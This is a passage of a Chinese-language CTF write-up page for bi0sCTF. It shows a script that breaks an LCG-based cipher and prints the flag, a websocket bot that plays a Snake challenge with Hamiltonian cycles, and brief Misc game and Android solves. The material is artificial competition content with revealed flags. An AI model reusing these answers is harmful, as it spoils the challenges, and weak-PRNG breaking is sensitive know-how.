class="hljs-number">6674831873895816998217860257081780104168741154329195649911902365299495130324698497916172758145782383658122037059537201009889153133307754158</span>), (<span class="hljs-number">88</span>, <span class="hljs-number">5323014117483698150842190422231005724805137799598831691161862346623039247622359972881775361362745899238680458901399065283489317592046388919</span>), (<span class="hljs-number">85</span>, <span class="hljs-number">3763698408921732607951773848228884704668238062686979349129116312470621538052054791662510364394420612090312977770614743449723324784458538150</span>)]
+
+ciphertext = []
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ct)):<span class="hljs-comment">#len(ct)):</span>
+    n,s = ct[i]
+    st = <span class="hljs-built_in">int</span>(s   * inverse(r,q))  % q
+    strs = <span class="hljs-string">&quot;&quot;</span>
+    <span class="hljs-keyword">for</span> puc_inv <span class="hljs-keyword">in</span> public[-n:]:
+        <span class="hljs-keyword">if</span> st &gt; puc_inv <span class="hljs-keyword">or</span> (puc_inv == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> st == <span class="hljs-number">1</span>):
+            st = st % puc_inv
+            strs = <span class="hljs-string">&quot;1&quot;</span> + strs
+        <span class="hljs-keyword">else</span>:
+            strs = <span class="hljs-string">&quot;0&quot;</span> + strs
+
+    ciphertext.append(<span class="hljs-built_in">int</span>(strs,<span class="hljs-number">2</span>))
+<span class="hljs-built_in">print</span>(ciphertext[:<span class="hljs-number">4</span>])
+
+FLAG_FORMAT = <span class="hljs-string">&quot;bi0s&quot;</span>
+
+NBITS = <span class="hljs-number">44</span>&lt;&lt;<span class="hljs-number">2</span>
+
+a = <span class="hljs-number">0xBAD2C0DE</span>
+c = <span class="hljs-number">0x6969</span>
+m = <span class="hljs-number">1</span>&lt;&lt;NBITS
+<span class="hljs-string">&#x27;&#x27;&#x27;
+
+for i,f in enumerate(FLAG):
+    state = (state*a+c)%m
+    ciphertext.append((state&gt;&gt;(NBITS&gt;&gt;1))^^i^^ord(f))
+&#x27;&#x27;&#x27;</span>
+states = [<span class="hljs-number">0</span>]
+<span class="hljs-keyword">for</span> i,f <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(FLAG_FORMAT):
+    states.append((ciphertext[i]^i^<span class="hljs-built_in">ord</span>(f))&lt;&lt;(NBITS&gt;&gt;<span class="hljs-number">1</span>))
+<span class="hljs-comment"># print(states)</span>
+<span class="hljs-comment"># print(NBITS&gt;&gt;1)</span>
+<span class="hljs-comment"># s1 + s1_ = (s0 + s0_) * a + c %m</span>
+<span class="hljs-comment"># (s1 - a*s0-c) + s1_ - a*s0_ %m</span>
+
+<span class="hljs-string">&#x27;&#x27;&#x27;A = [1]
+B = [0]
+for i in range(1, len(states)-1):
+    A.append(a*A[i-1] % m)
+    B.append((a*B[i-1]+a*states[i]+c-states[i+1]) % m)
+A = A[1:]
+B = B[1:]
+M = matrix(ZZ, 2+len(A), 2+len(A))
+
+for i in range(len(A)):
+    M[i, i] = m
+    M[len(A), i] = A[i]
+    M[len(A)+1, i] = B[i]
+    M[i, len(A)] = M[i, len(A)+1] = 0
+M[len(A), len(A)] =  1
+M[len(A)+1, len(A)+1] = 2^88
+M[len(A), len(A)+1]= 0
+ML = M.LLL()&#x27;&#x27;&#x27;</span>
+states = states[<span class="hljs-number">1</span>:]
+[<span class="hljs-number">264893701359261384184087199</span>,<span class="hljs-number">96391972943163767741116235</span>,<span class="hljs-number">308702811501065345352543347</span>,<span class="hljs-number">304985483494140320227177621</span>]
+<span class="hljs-built_in">print</span>((((states[<span class="hljs-number">0</span>]+<span class="hljs-number">304985483494140320227177621</span>)*a+c)%m)&gt;&gt;(NBITS&gt;&gt;<span class="hljs-number">1</span>) == states[<span class="hljs-number">1</span>]&gt;&gt;(NBITS&gt;&gt;<span class="hljs-number">1</span>))
+
+seed = ((states[<span class="hljs-number">0</span>]+<span class="hljs-number">304985483494140320227177621</span> - c) * inverse(a,m)) % m 
+<span class="hljs-built_in">print</span>(seed)
+
+a = <span class="hljs-number">0xBAD2C0DE</span>
+c = <span class="hljs-number">0x6969</span>
+m = <span class="hljs-number">1</span>&lt;&lt;NBITS
+state = states[<span class="hljs-number">0</span>]+<span class="hljs-number">304985483494140320227177621</span>
+
+plaintext = []
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">44</span>):
+    <span class="hljs-keyword">if</span> i==<span class="hljs-number">0</span>:
+        <span class="hljs-keyword">continue</span>
+    state = (state*a+c)%m
+    plaintext.append((state&gt;&gt;(NBITS&gt;&gt;<span class="hljs-number">1</span>))^i^ciphertext[i])
+<span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;b&#x27;</span> + <span class="hljs-built_in">bytes</span>(plaintext))
+<span class="hljs-comment">#bi0sctf{lcg_is_good_until_you_break_them_!!}</span></code></pre><h2 id="misc"><a class="header-link" href="#misc"></a>Misc:</h2>
+<h3 id="snek-game"><a class="header-link" href="#snek-game"></a>Snek Game:</h3>
+<p>就是自动化玩游戏，不过每次可以输入一个移动序列，所以只需要构造一个哈密顿回路让蛇每次从 (0, 0) 出发回到 (0, 0) ，这样每次给一个哈密顿回路就能不断变长。
+不过这个题的食物生成比较奇怪，它只会生成在中心 <code>25*25</code> 的区域内，这就需要稍微构造一下哈密顿回路（因为随意的哈密顿回路最后因为蛇身过长把中间的区域覆盖后，导致食物无法生成就会报 error），而且不能只构造一条哈密顿回路（可以证明 <code>31*31</code> 的格子最长的哈密顿回路也会有一个格子无法经过，如果只有一条哈密顿回路，一旦食物生成在没有被经过的格子上就寄了），而且还需要注意两条哈密顿回路之间不能冲突（否则蛇会触碰到蛇身）
+最后我构造了两条不经过 (3, 3) 跟 (4, 4) 的回路，然后不断给 server 发就 ok 了。</p>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> websocket
+
+ws = websocket.WebSocket()
+
+ws.connect(<span class="hljs-string">&quot;ws://instance.chall.bi0s.in:10130/&quot;</span>)
+
+<span class="hljs-keyword">import</span> json
+resp = ws.recv()
+head = [<span class="hljs-number">26</span>, <span class="hljs-number">26</span>]
+s = <span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-keyword">while</span> head[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">0</span>:
+    head[<span class="hljs-number">0</span>] -= <span class="hljs-number">1</span>
+    s += <span class="hljs-string">&quot;u&quot;</span>
+<span class="hljs-keyword">while</span> head[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">0</span>:
+    head[<span class="hljs-number">1</span>] -= <span class="hljs-number">1</span>
+    s += <span class="hljs-string">&quot;l&quot;</span>
+ws.send(s)
+resp = json.loads(ws.recv())
+<span class="hljs-keyword">assert</span>(resp[<span class="hljs-string">&quot;head&quot;</span>] == [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>])
+
+s1 = <span class="hljs-string">&quot;d&quot;</span>*<span class="hljs-number">30</span>+<span class="hljs-string">&quot;r&quot;</span>+<span class="hljs-string">&quot;u&quot;</span>*<span class="hljs-number">29</span>+<span class="hljs-string">&quot;r&quot;</span>+<span class="hljs-string">&quot;d&quot;</span>*<span class="hljs-number">29</span>+<span class="hljs-string">&quot;r&quot;</span>+<span class="hljs-string">&quot;rulu&quot;</span>*<span class="hljs-number">13</span>+<span class="hljs-string">&quot;ruulurr&quot;</span>+(<span class="hljs-string">&quot;d&quot;</span>*<span class="hljs-number">29</span>+<span class="hljs-string">&quot;r&quot;</span>+<span class="hljs-string">&quot;u&quot;</span>*<span class="hljs-number">29</span>+<span class="hljs-string">&quot;r&quot;</span>)*<span class="hljs-number">12</span>+<span class="hljs-string">&quot;d&quot;</span>*<span class="hljs-number">29</span>+<span class="hljs-string">&quot;r&quot;</span>+<span class="hljs-string">&quot;u&quot;</span>*<span class="hljs-number">30</span>+<span class="hljs-string">&quot;l&quot;</span>*<span class="hljs-number">30</span>
+s2 = <span class="hljs-string">&quot;d&quot;</span>*<span class="hljs-number">30</span>+<span class="hljs-string">&quot;r&quot;</span>+<span class="hljs-string">&quot;u&quot;</span>*<span class="hljs-number">29</span>+<span class="hljs-string">&quot;r&quot;</span>+<span class="hljs-string">&quot;d&quot;</span>*<span class="hljs-number">29</span>+<span class="hljs-string">&quot;r&quot;</span>+<span class="hljs-string">&quot;rulu&quot;</span>*<span class="hljs-number">13</span>+<span class="hljs-string">&quot;urulurr&quot;</span>+(<span class="hljs-string">&quot;d&quot;</span>*<span class="hljs-number">29</span>+<span class="hljs-string">&quot;r&quot;</span>+<span class="hljs-string">&quot;u&quot;</span>*<span class="hljs-number">29</span>+<span class="hljs-string">&quot;r&quot;</span>)*<span class="hljs-number">12</span>+<span class="hljs-string">&quot;d&quot;</span>*<span class="hljs-number">29</span>+<span class="hljs-string">&quot;r&quot;</span>+<span class="hljs-string">&quot;u&quot;</span>*<span class="hljs-number">30</span>+<span class="hljs-string">&quot;l&quot;</span>*<span class="hljs-number">30</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">s</span>):</span>
+    head = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>]
+    size = <span class="hljs-number">31</span>
+    d = {}
+    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> s:
+        <span class="hljs-keyword">if</span> ch == <span class="hljs-string">&quot;l&quot;</span>:
+            head[-<span class="hljs-number">1</span>] -= <span class="hljs-number">1</span>
+        <span class="hljs-keyword">elif</span> ch == <span class="hljs-string">&quot;r&quot;</span>:
+            head[-<span class="hljs-number">1</span>] += <span class="hljs-number">1</span>
+        <span class="hljs-keyword">elif</span> ch == <span class="hljs-string">&quot;u&quot;</span>:
+            head[<span class="hljs-number">0</span>] -= <span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span>:
+            head[<span class="hljs-number">0</span>] += <span class="hljs-number">1</span>
+        <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span> &lt;= head[<span class="hljs-number">0</span>] &lt; size
+        <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span> &lt;= head[<span class="hljs-number">1</span>] &lt; size
+        <span class="hljs-keyword">assert</span>(<span class="hljs-built_in">tuple</span>(head) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> d)
+        d[<span class="hljs-built_in">tuple</span>(head)] = <span class="hljs-number">1</span>
+    <span class="hljs-keyword">assert</span> head == [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>]
+
+check(s1)
+check(s2)
+<span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(s1) == <span class="hljs-number">960</span>)
+<span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(s2) == <span class="hljs-number">960</span>)
+
+<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+    ws.send(s1)
+    resp = ws.recv()
+    <span class="hljs-built_in">print</span>(resp)
+    resp = json.loads(resp)
+    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> resp):
+        <span class="hljs-built_in">print</span>(resp[<span class="hljs-string">&quot;flag&quot;</span>])
+        <span class="hljs-keyword">break</span>
+    ws.send(s2)
+    resp = ws.recv()
+    <span class="hljs-built_in">print</span>(resp)
+    resp = json.loads(resp)
+    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> resp):
+        <span class="hljs-built_in">print</span>(resp[<span class="hljs-string">&quot;flag&quot;</span>])
+        <span class="hljs-keyword">break</span>
+
+ws.close()</code></pre><h3 id="rgb-cheems"><a class="header-link" href="#rgb-cheems"></a>RGB Cheems:</h3>
+<p>修改复活点在终点附近，自杀，往前走，跳下去就是flag</p>
+<p class="img-container"><img src="https://imgur.com/TZdRGi3.png" alt=""></p>
+<p class="img-container"><img src="https://imgur.com/Otuz1aY.png" alt=""></p>
+<h3 id="droidcomp"><a class="header-link" href="#droidcomp"></a>DroidComp:</h3>
+<p>新建一个工程直接引用题目中的so，调用s和ss</p>
+<p class="img-container"><img src="https://imgur.com/C4i6fFH.png" alt=""></p>
+<h2 id="结语"><a class="header-link" href="#结语"></a>结语:</h2>
+<p>希望大家喜欢以及有所收获,另外如果有错误欢迎指出私信以及邮箱都可,十分感谢!</p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
+<!--
+    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
+    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
+    Respective Copyrights apply.
+ -->
